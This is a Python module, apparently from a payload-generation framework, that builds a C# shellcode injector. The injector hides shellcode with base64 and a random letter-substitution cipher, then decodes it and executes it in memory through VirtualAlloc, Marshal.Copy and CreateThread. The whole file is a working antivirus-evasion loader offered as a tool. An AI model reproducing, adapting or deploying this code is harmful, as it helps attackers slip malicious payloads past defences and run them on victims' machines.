"""

C# inline injector that utilizes base64 encoding and a randomized alphabetic 
letter substitution cipher to obscure the shellcode string in the payload.


Module built by @the_grayhound

TODO: obfuscation!

"""

import string, random

from modules.common import shellcode
from modules.common import encryption

class Stager:
	
	def __init__(self):
		# required
		self.shortname = "b64SubVirtualAlloc"
		self.description = "C# method that base64/letter substitutes the shellcode to inject"
		self.rating = "Normal"
		self.language = "c#"
		self.extension = "cs"
		
		# options we require user ineraction for- format is {Option : [Value, Description]]}
		self.required_options = {"compile_to_exe" : ["Y", "Compile to an executable"]}
		
		#self.notes = ("\n\tTo compile with Visual Studio. To hide the console, set 'PROJECTNAME'/'Payload Properties'/'Output Type' to 'Windows Appliation'\n")
		
		
	def generate(self):
		
		self.shellcode = shellcode.Shellcode()
		Shellcode = self.shellcode.generate()
		
		# the 'key' is a randomized alpha lookup table [a-zA-Z] used for substitution
		key = ''.join(sorted(list(string.ascii_letters), key=lambda *args: random.random()))
		base64payload = encryption.b64sub(Shellcode,key)
		
		payloadCode = "using System; using System.Net; using System.Text; using System.Linq; using System.Net.Sockets;" 
		payloadCode += "using System.Collections.Generic; using System.Runtime.InteropServices;\n"
		payloadCode += "namespace payload { class Program { private static string d(string t, string key) {\n"
		payloadCode += "string b = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\";\n"
		payloadCode += "string r = \"\"; Dictionary<char, char> d = new Dictionary<char, char>();\n"
		payloadCode += "for (int i = 0; i < b.Length; ++i){ d.Add(key[i], b[i]); }\n"
		payloadCode += "for (int i = 0; i < t.Length; ++i){ if ((t[i] >= 'A' && t[i] <= 'Z') || (t[i] >= 'a' && t[i] <= 'z')) { r += d[t[i]];}\n"
		payloadCode += "else { r += t[i]; }} return r; }\n"
		payloadCode += "static public string DecodeFrom64(string encodedData) {\n"
		payloadCode += "byte[] encodedDataAsBytes = System.Convert.FromBase64String(encodedData);\n"
		payloadCode += "string returnValue = System.Text.ASCIIEncoding.ASCII.GetString(encodedDataAsBytes);\n"
		payloadCode += "return returnValue; }\n"
		payloadCode += "static void Main() {\n"
		payloadCode += "string base64payload = \"%s\";\n" % (base64payload)
		payloadCode += "string key = \"%s\";\n" %(key)
		payloadCode += "string p = (DecodeFrom64(d(base64payload, key)).Replace(\"\\\\\", \",0\")).Substring(1);\n"
		payloadCode += "string[] chars = p.Split(',').ToArray();\n"
		payloadCode += "byte[] shellcode = new byte[chars.Length];\n"
		payloadCode += "for (int i = 0; i < chars.Length; ++i) { shellcode[i] = Convert.ToByte(chars[i], 16); }\n"
		payloadCode += "UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n"
		payloadCode += "Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);\n"
		payloadCode += "IntPtr hThread = IntPtr.Zero; UInt32 threadId = 0; IntPtr pinfo = IntPtr.Zero;\n"
		payloadCode += "hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);\n"
		payloadCode += "WaitForSingleObject(hThread, 0xFFFFFFFF);}\n"
		payloadCode += "private static UInt32 MEM_COMMIT = 0x1000; private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;\n"
		payloadCode += """[DllImport(\"kernel32\")] private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
        [DllImport(\"kernel32\")]private static extern IntPtr CreateThread(
          UInt32 lpThreadAttributes,
          UInt32 dwStackSize,
          UInt32 lpStartAddress,
          IntPtr param,
          UInt32 dwCreationFlags,
          ref UInt32 lpThreadId);
        [DllImport(\"kernel32\")] private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds); } }\n"""

		return payloadCode

